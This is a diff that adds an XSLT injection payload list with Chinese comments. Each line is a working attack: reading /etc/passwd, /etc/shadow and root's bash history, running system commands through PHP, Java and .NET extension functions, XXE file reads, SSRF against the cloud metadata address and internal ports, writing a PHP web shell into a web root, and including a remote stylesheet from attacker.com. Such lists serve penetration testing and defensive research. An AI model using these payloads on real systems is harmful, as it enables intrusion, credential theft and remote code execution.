@@ -1,0 +1,24 @@
+# XSLT - 读取系统密码文件
+<xsl:value-of select="unparsed-text('/etc/passwd')"/>
+# XSLT - PHP Wrapper 执行系统命令
+<xsl:value-of select="php:function('system','cat /etc/shadow')"/>
+# XSLT - Java Runtime 执行系统命令读取密码
+<xsl:value-of select="Runtime:getRuntime():exec('cat /etc/passwd')"/>
+# XSLT - .NET Process.Start 命令执行
+<xsl:value-of select="user:Process.Start('cmd.exe','/c whoami')"/>
+# XSLT - XXE 文件读取 /etc/passwd
+<!DOCTYPE xsl:stylesheet [<!ENTITY passwd SYSTEM "file:///etc/passwd">]><xsl:value-of select="&passwd;"/>
+# XSLT - EXSLT document() SSRF 攻击内网
+<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
+# XSLT - 文件写入 (EXSLT exsl:document)
+<exsl:document href="/var/www/html/xslt.php" method="text"><?php system($_GET[1]);?></exsl:document>
+# XSLT - document() 端口扫描内网服务
+<xsl:value-of select="document('http://10.0.0.1:3306')"/>
+# XSLT - Java XSLT 读取 Java 系统属性
+<xsl:value-of select="system-property('java.version')"/>
+# XSLT - .NET 加载外部 XSLT 文件实现代码注入
+<xsl:include href="http://attacker.com/evil.xslt"/>
+# XSLT - XML 外部实体注入 + 命令执行
+<xsl:value-of select="system-property('xsl:vendor')"/><xsl:value-of select="php:function('system','id')"/>
+# XSLT - 读取 /root/.bash_history
+<xsl:value-of select="unparsed-text('/root/.bash_history')"/>
